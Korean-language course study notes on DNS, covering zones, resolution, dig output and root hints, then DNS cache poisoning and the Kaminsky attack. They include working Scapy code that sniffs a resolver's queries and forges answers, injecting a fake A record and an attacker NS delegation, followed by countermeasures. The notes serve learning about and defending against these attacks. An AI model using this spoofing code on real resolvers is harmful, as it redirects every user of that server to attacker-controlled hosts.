# Ch7. DNS and Attacks 정리

## 1. Domain Hierarchy vs Zone — 차이점

### Domain Hierarchy (도메인 계층, p.4·6)
- 도메인 네임스페이스는 **트리(tree) 구조**다. 최상위는 **ROOT(`.`)**.
- ROOT 아래 **TLD(Top-Level Domain)**: `.com .net .gov`(gTLD), `.kr .cn .uk`(ccTLD), `.arpa`(infra), `.edu .gov`(sTLD) 등.
- 그 아래 **2nd-level domain**(회사·학교 등): `example.com`, `google.com`.
- 즉 **hierarchy = 이름이 어떻게 나뉘는가에 대한 "논리적 이름 구조" 전체**.

### Zone (존, p.5)
- **Zone = 한 관리 주체(authoritative name server)가 실제로 관리·응답하는 단위**(= zone file로 정의되는 관리 구역).
- 한 도메인의 하위가 **위임(delegation)** 되면 그 부분은 **별도의 zone**이 된다.
- 슬라이드 예:
  - `example.com` = **Zone 1**
  - `usa.example.com` = **Zone 2** (그 아래 `chicago`, `boston`은 별도 위임이 없어 **Zone 2에 포함**)
  - `uk.example.com` = **Zone 3**, `france.example.com` = **Zone 4**
  - `nyc.example.com` = **Zone 5** (usa 아래지만 따로 위임 → 독립 zone)

### 핵심 차이
| | Domain (Hierarchy) | Zone |
|---|---|---|
| 의미 | 이름 공간의 **논리적 트리** | **관리/위임의 실제 단위** |
| 범위 | 자기 하위 전부 포함하는 개념 | 위임된 하위는 **제외**(그 하위는 다른 zone) |
| 예 | `example.com` 도메인 = 모든 하위 | Zone 1 = `example.com`이되 usa/uk/france/nyc는 빠짐 |

> 한 줄: **도메인은 "이름의 가지(subtree) 전체", 존은 "한 네임서버가 책임지는 구간"**. 위임이 일어나면 한 도메인이 여러 zone으로 쪼개진다.

---

## 2. DNS Query Process & Local DNS Server / 파일들의 역할

### Local DNS 파일 (p.10)
- **`/etc/hosts`**: 일부 hostname↔IP를 **로컬에 직접** 저장. 머신은 **local DNS 서버에 묻기 전에 이 파일을 먼저** 확인한다.
- **`/etc/resolv.conf`**: 머신의 **resolver에게 local DNS 서버의 IP를 알려주는** 설정 파일(`nameserver ...`). DHCP가 준 local DNS 서버 IP도 여기 저장됨.

### Query 흐름 & Cache (p.9, 11–14)
1. User Machine의 resolver가 먼저 `/etc/hosts` 확인 → 없으면 `/etc/resolv.conf`의 **Local DNS Server**에 질의.
2. Local DNS Server는 **cache**를 먼저 본다. 없으면 **iterative query**로 계층을 따라 내려간다:
   - **Root server** 에 질의 → `.com`을 담당하는 **gTLD 서버로 referral**(NS + glue).
   - **`.com` 서버** 에 질의 → `example.com`의 **authoritative 서버로 referral**.
   - **example.com authoritative 서버** 에 질의 → **최종 A 레코드(IP) 응답**.
3. Local DNS Server는 결과를 **TTL 동안 cache** 하고 User에게 돌려줌.
- **Recursive vs Iterative**: User↔LocalDNS는 보통 recursive(끝까지 답을 받음), LocalDNS↔계층 서버들은 iterative(referral을 받아 스스로 따라감).

---

## 3. dig 등 명령어 — 언제 쓰고 결과는?

| 명령 | 언제/무엇 | 결과 |
|------|-----------|------|
| `dig www.example.com` | 일반 재귀 질의(기본 resolver 통해) | ANSWER에 A 레코드 |
| `dig @<server> name` | **특정 서버**에게 직접 질의 (iterative 추적) | 그 서버의 ANSWER 또는 referral |
| `dig @10.0.2.7 -p 1053 www.example.com` | **특정 IP·포트**의 DNS 서버 테스트(실습용 자작 서버, p.41) | 그 서버 응답 확인 |
| `dig +trace name` | root부터 단계별 referral 추적 | 각 레벨의 NS referral 연쇄 |
| `dig @a.gtld-servers.net www.example.net` (p.12) | `.net` 서버에 직접 질의 | AUTHORITY=example.net NS, ADDITIONAL=그 NS의 IP |
| `rndc flush` | local DNS 서버 cache 비우기 | 캐시 초기화(공격 재현·검증 시) |

### 실제 실행 결과 (이 정리에서 직접 돌려봄)
```
$ dig @a.root-servers.net www.example.com        # 1) ROOT → .com 위임(referral)
com.        172800  IN  NS  l.gtld-servers.net.
com.        172800  IN  NS  j.gtld-servers.net.
...
$ dig @a.gtld-servers.net www.example.com        # 2) .COM → example.com 위임
example.com.  172800 IN  NS  hera.ns.cloudflare.com.
example.com.  172800 IN  NS  elliott.ns.cloudflare.com.
$ dig @a.iana-servers.net www.example.com        # 3) authoritative → 최종 답
www.example.com. 300 IN CNAME www.example.com.cdn.cloudflare.net.
```
→ 슬라이드의 **root → TLD → authoritative** iterative 과정을 그대로 재현(현재 example.com은 Cloudflare로 위임되어 있음을 확인).

---

## 4. Root Zone File 실제로 돌려보기

### Local DNS는 root 서버 IP를 어떻게 아는가 (p.18)
- 부팅 시 **root hints** 파일로 미리 알고 시작한다.
```
$ cat /etc/bind/named.conf.default-zones
zone "." {                       // root zone
    type hint;                   // "hint" = root 서버 목록을 prime
    file "/etc/bind/db.root";    // 13개 root 서버(A~M)의 NS + A/AAAA
};
```
- `db.root`에는 `A.ROOT-SERVERS.NET ... M.ROOT-SERVERS.NET`의 주소가 들어있어 **처음 한 번 root에 닿는 출발점**이 된다.

### Root Zone File (p.19·20)
- 공개 위치: `https://www.internic.net/domain/root.zone`. 내용은 각 TLD의 **위임 정보**(`com. NS a.gtld-servers.net.` …)와 DNSSEC(DS/RRSIG) 레코드.
- 도메인을 새로 사면(p.20, 예 `bank32.com`) 상위 `.com` zone에 **NS 레코드(위임) + glue(A/AAAA)** 가 추가되어 계층에 연결된다.

### 직접 실행한 결과 (live)
```
$ dig @a.root-servers.net . NS          # root zone의 NS 레코드(= 13개 root 서버)
.   518400  IN  NS  a.root-servers.net.
.   518400  IN  NS  b.root-servers.net.
... (a ~ m, 총 13개)

$ dig @a.root-servers.net . NS  (additional: glue, "root hints"의 실체)
l.root-servers.net.  IN  A     199.7.83.42
j.root-servers.net.  IN  A     192.58.128.30
f.root-servers.net.  IN  A     192.5.5.241
h.root-servers.net.  IN  A     198.97.190.53 ...

$ dig @a.root-servers.net com. NS       # root에게 .com 위임을 물어봄
com.  172800  IN  NS  a.gtld-servers.net. ... (a ~ m)
a.gtld-servers.net.  IN  A  192.5.6.30   (glue)
```
→ root zone이 실제로 **13개 root 서버**와 **각 TLD로의 위임**을 담고 있음을 확인.

---

## 5. Attack Surface — 위치별 대상과 파급력 (p.43)

슬라이드의 4개 지점(①~④), User → Local DNS → 계층(Root/.com/Authoritative) 경로상:

| # | 위치 | 무엇을/누구를 공격 | 파급력 |
|---|------|---------------------|--------|
| ① | **User Machine의 local 파일** | `/etc/hosts`, `/etc/resolv.conf` 변조 | **그 한 대만** 영향. local 접근 필요. 가장 작음 |
| ② | **User ↔ Local DNS 구간** | 사용자 질의에 **가짜 응답 위조**(또는 local DNS 장악) | 그 **LAN의 사용자들**. 경로/LAN 상에 있어야 함 |
| ③ | **Local DNS ↔ 인터넷(계층) 구간** | local DNS의 질의에 가짜 응답 → **cache 오염(Cache Poisoning)** | **그 local DNS를 쓰는 모든 사용자**. **원격(Kaminsky)** 가능 → 영향 큼 |
| ④ | **Authoritative name server 자체** | 권한 서버(예 `malicious.com`/대상 도메인 서버) 장악 | 그 도메인을 찾는 **전 세계 사용자**. 영향 최대, 난이도 최고 |

> 파급력: ① < ② < ③ < ④. 실습/시험 핵심은 **③ cache poisoning**(한 번 오염되면 다수에게, 원격 가능)과 **④**(범위 최대).

---

## 6. DNS Cache Poisoning Attack

### Sniffing & Spoofing (p.45)
같은 LAN에서 공격자가:
- (a) **Local DNS ↔ 글로벌 서버 구간**을 sniff → local DNS에게 가짜 응답을 보내 **cache 오염**.
- (b) **User ↔ Local DNS 구간**을 sniff → 사용자에게 가짜 응답.

### 가짜 응답의 조건 (p.46)
위조 DNS 응답이 수락되려면: `src port = 53`, **dst = local DNS의 질의 source port**, `Flags = 0x8400`(응답·authoritative), 그리고 **Transaction ID 일치**. (local 공격은 sniff로 ID를 그대로 알 수 있어 쉬움.)

### Local Cache Poisoning 코드 (p.47) — 전체 해석
```python
def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        IPpkt  = IP(dst=pkt[IP].src, src=pkt[IP].dst)            # 응답: 방향 반대로
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)             # dst=질의 src포트, src=53
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                       rdata='1.2.3.4', ttl=259200)              # 가짜 A: www.example.com→1.2.3.4
        DNSpkt = DNS(id=pkt[DNS].id, aa=1, rd=0,                 # id=질의ID(sniff), aa=권한응답
                     qdcount=1, qr=1, ancount=1,                 # qr=1(응답), answer 1개
                     qd=pkt[DNS].qd, an=Anssec)
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
# local DNS(10.0.2.7)가 밖으로 보내는 질의(udp/53)를 sniff
pkt = sniff(filter='udp and (src host 10.0.2.7 and dst port 53)', prn=spoof_dns)
```
- 핵심: **sniff로 Transaction ID(`pkt[DNS].id`)와 source port를 그대로 복사** → 위조 응답이 정확히 매칭됨.
- 결과(p.48–49): local DNS cache에 `www.example.com → 1.2.3.4`가 들어가 **그 서버를 쓰는 모두가** 가짜 IP로 감. 청소: `sudo rndc flush`.

### 도메인 전체 hijack — Authority Section 노리기 (p.50–51)
한 레코드(A)만 위조하는 대신, 응답의 **AUTHORITY 섹션에 NS 레코드를 위조**해 넣으면 **도메인 전체**를 공격자 서버로 위임시킬 수 있다.
```python
Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',  rdata='1.2.3.4',        ttl=259200)
NSsec  = DNSRR(rrname='example.com',     type='NS', rdata='ns.attacker32.com', ttl=259200)
DNSpkt = DNS(id=pkt[DNS].id, aa=1, rd=0, qdcount=1, qr=1,
             ancount=1, nscount=1,                  # NS 레코드 1개 추가
             qd=pkt[DNS].qd, an=Anssec, ns=NSsec)
```
→ `example.com NS = ns.attacker32.com`이 캐시되어 **이후 example.com의 모든 이름**을 공격자 NS가 답하게 됨.

---

## 7. Kaminsky Attack — Challenge 1, 2

### 배경: 왜 어려운가 (원격 공격, p.55)
- 목표: `www.example.com → 공격자 IP`. 단 공격자는 **LAN에 없어서 sniff 불가** → 위조 응답의 **16-bit Transaction ID(0~65535)를 추측**해야 한다. (src IP, dst port도 맞춰야 함)

### Challenge 1 — The Timing of the Spoofing (p.56)
- local DNS는 질의를 보낸 뒤 **가장 먼저 도착한, 조건에 맞는 응답을 받아들이고 나머지는 버린다.**
- 따라서 공격자의 위조 응답은 **진짜 authoritative 서버의 응답보다 먼저** 도착해야 한다.
- 질의를 보낸 순간부터 진짜 응답이 오기 전까지의 **좁은 시간 창** 안에, 추측한 ID로 **위조 응답을 대량 폭주**시켜 경쟁(race)에서 이겨야 한다.

### Challenge 2 — The Cache Effect (p.57)
- 만약 경쟁에서 지면(진짜 응답이 먼저), local DNS는 그 **정답을 TTL 동안 cache** 한다.
- TTL 동안에는 **같은 이름을 다시 질의하지 않으므로** 공격자는 **재시도를 할 수 없다**(이름당 사실상 TTL에 한 번). → 16-bit ID brute-force가 비현실적이 됨.

### Kaminsky의 해결 (p.58–59) — challenge 1·2를 동시에 깨는 트릭
- **존재하지 않는 랜덤 서브도메인을 질의**하게 만든다: `twysw.example.com`, `aaab.example.com`, ... 매번 다른 이름.
  - 랜덤 이름은 **cache에 없으므로(cache miss)** local DNS가 **매번 새 질의를 보낸다** → **재시도 무제한**(Challenge 2 무력화).
- 각 위조 응답에는 답 자체보다 **AUTHORITY 섹션에 `example.com NS = ns.attacker32.com`** 을 넣는다.
  - 질의한 랜덤 이름은 없어도, **example.com 전체의 NS 위임이 cache**되어 **도메인 전체를 탈취**(Challenge 1을 한 번만 이기면 큰 보상).
- 그림(p.59): (1) 공격자가 victim DNS에 `twysw.example.com` 질의 → (2) victim이 example.com 서버에 질의 → (3) 공격자가 `ns.attacker32.com`을 authority에 담은 위조 응답을 **ID 추측해 폭주**. 맞으면 example.com이 공격자 NS로 넘어감.

### 대응 (p.66)
- **Source port 무작위화**(추측 공간 16+16 bit로 확대), **0x20 인코딩**, 근본적으로 **DNSSEC**(응답에 서명 → 위조 검증), **HTTPS**(IP가 틀려도 인증서로 탐지).

### 한 줄 요약
DNS는 인증 없는 UDP라 **먼저 도착하고 ID만 맞으면 믿는다**. Local 공격은 sniff로 ID를 알아 쉽고, 원격 Kaminsky는 **랜덤 서브도메인(캐시 우회) + authority의 NS 위조(도메인 전체 탈취)** 로 ID brute-force를 현실화한다.
